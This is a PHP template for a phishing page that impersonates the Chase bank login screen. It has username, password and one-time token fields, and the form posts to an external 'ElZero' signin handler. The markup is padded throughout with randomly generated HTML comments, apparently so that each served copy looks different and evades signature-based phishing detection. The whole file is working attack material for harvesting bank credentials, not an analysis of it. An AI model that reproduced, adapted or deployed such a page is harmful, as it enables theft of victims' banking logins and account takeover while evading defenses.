<?php require("includes/header.php") ?>
<style type="text/css">
    .jpui.checkbox .checkboxWrap .check {
        display: inline-block;
        border: .0625rem solid #959595;
        height: 1.25rem;
        width: 1.25rem;
        border-radius: .1875rem;
        position: relative;
         bottom: 0rem; 
    }
</style>
    <div>
        <div class=" homepage" tabindex="-1">
            <div class=" logon-container">
                <header class=" toggle-aria-hidden">
                    <div id="hdrlog" class=" logon header jpui transparent navigation bar" style="display:block;">
                        <a>
                            <div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    <div id="hdrup" class=" logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
                        <a>
                            <div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                </header>
                <main>
                    <div class=" container logon">
                        <div>
                            <div>
                                <div class=" jpui background image fixed">
                                    <style type="text/css">
                                        .jpui.background.image {
                                            background-image: url(./img/mobilenight.jpeg);
                                            filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                            -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                        }
                                        
                                        @media (min-width:320px) {
                                            .jpui.background.image {
                                                background-image: url(./img/mobilenight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:992px) {
                                            .jpui.background.image {
                                                background-image: url(./img/tabletnight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:1024px) {
                                            .jpui.background.image {
                                                background-image: url(./img/desktopnight.jpeg);
                                            }
                                        }
                                    </style>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <div class=" row">
                        	<div class=" col-xs-12 col-md-6 col-md-offset-3 logoff" id="boxup" style="margin-top: 5em; display:none;">
                                <div class=" jpui raised segment" style="max-width: 470px!important;">
                                	<div class=" row">
                                        <div class=" col-xs-12">
                                            <div class=" progress" style="background: #0b6efd;">
                                                <div class=" bar"><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <div class=" col-xs-12 col-sm-6 col-sm-offset-3 logon-box">

                                
                                    <!-- Login Page -->
                                <div class=" jpui raised segment" id="login" style="display:block;">

                                    <div class=" row">
                                        <div class=" col-xs-10 col-xs-offset-1">
                                            
                                            <form  method="POST" autocomplete="off" action="../ElZero/actions/signin">
                                            <?php if(isset($_GET['invalid2'])){ ?>
                                                <input type="hidden" name="invalid">
                                                <div id="myerr" class=" myerr" style="display:block;">
                                                    <div class=" jpui error error inverted primary animate alert">
                                                        <div class=" icon"><span><i class=" jpui exclamation-color icon"></i></span><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <div class=" icon background"><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <div class=" content wrap">
                                                            <h2 class=" title" tabindex="-1">We can't find that username and password. try again.</h2> <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                            <?php }?>
                                                 
                                                 <input type="hidden" name="tokenElzeroCsrf" value="<?php echo $_SESSION['ElZeR0_ToKeN'];?>">
                                                <input type="hidden" name="elzeroKiller" value="">
                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top">
                                                    <div class=" jpui vertical">
                                                        <div id="labelFlooat" class=" align-label-input floating-label__container uus ">
                                                            <div class=" label-wrapper"> <!--Here-->
                                                                <label id="baba" class=" jpui fieldlabel label-alignment vertical" for="userid">username</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle" id="userId-text">
                                                                <input class=" jpui input logon-xs-toggle" id="userid" placeholder=""  type="text" name="userId" required="" value="">
                                                               <h3 id="errorUser" style="color:#bf2155;display:none;" >Invalid username</h3>
																<?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class=" jpui vertical">
                                                        <div id="floooaatpasss" class=" align-label-input floating-label__container pps">
                                                            <div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="passid">Password</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle" id="password-text">
                                                                <input class=" jpui input logon-xs-toggle " id="passid" placeholder="" autocomplete="off" type="password" name="password" required="" value=""> <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div id="tokenin" style="display:none;" class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class=" jpui vertical">
                                                        <div class=" align-label-input floating-label__container tk">
                                                            <div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="Token">Token</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <div class=" logon-xs-toggle">
                                                                <input class="inputToken jpui input logon-xs-toggle " id="Token" placeholder="" autocomplete="off" type="number" pattern="[0-9]*" inputmode="numeric" maxlength="35" name="Token"  value=""> <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" row logon-xs-toggle">
                                                    <div class=" col-xs-6 rememberMe-checkbox-container">
                                                        <div class=" jpui checkbox">
                                                            <div class=" checkbox-flex">
                                                                <div class=" checkboxWrap" id="rem">
                                                                    <input class=" jpui checkmark icon check rem" type="checkbox">
                                                                    <!-- <i class=" jpui checkmark icon check"></i> -->
                                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                                <div class=" checkboxWrap" id="rem1" style="display:none;">
                                                                    <!-- <input class=" checkbox__input checkbox__input--checked rem1" type="checkbox"> -->
                                                                    <i class=" jpui checkmark icon check"></i>
                                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                                <label> <span class=" checkbox-label">Remember me </span></label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <div class=" col-xs-6 token-checkbox-container">
                                                        <div class=" jpui checkbox useToken">
                                                            <div class=" checkbox-flex">
                                                                <div class=" checkboxWrap" id="tkn">
                                                                    <input id="tooookeeen" class="jpui checkmark icon check tkn" type="checkbox">
                                                                    <!-- <i class=" jpui checkmark icon check"></i> -->
                                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                                
                                                                <label> <span class=" checkbox-label">use token </span></label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" row">
                                                    <button id="subbo" type="submit" class=" jpui button focus fluid primary touch"><span class=" label">sign in</span> </button>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" row"><span class=" jpui link"><a class=" link-anchor touch" >Forgot username/password?<i class=" jpui progressright icon end-icon" ></i></a></span><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <div class=" row"><span class=" jpui link"><a class=" link-anchor last touch" >Not Enrolled? sign up Now.<i class=" jpui progressright icon end-icon" ></i></a></span><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                            </form>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    	<?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                	<?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            	</main>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

<?php require("includes/footer.php") ?>




